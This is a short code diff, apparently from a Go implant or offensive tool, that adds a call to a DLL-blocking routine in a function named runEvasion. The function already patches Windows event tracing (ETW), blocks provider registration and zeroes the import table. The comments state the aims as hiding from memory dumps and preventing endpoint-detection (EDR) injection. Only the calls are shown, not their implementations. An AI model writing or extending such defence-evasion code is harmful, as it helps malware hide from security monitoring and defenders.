@@ -15,4 +15,5 @@ func runEvasion() {
 	patchETW()
 	patchEtwRegister() // block future ETW provider registrations
 	iatStomp()         // zero IAT so memory dumps reveal no imports
+	blockNonMicrosoftDLLs() // prevent EDR DLL injection — must be last
 }
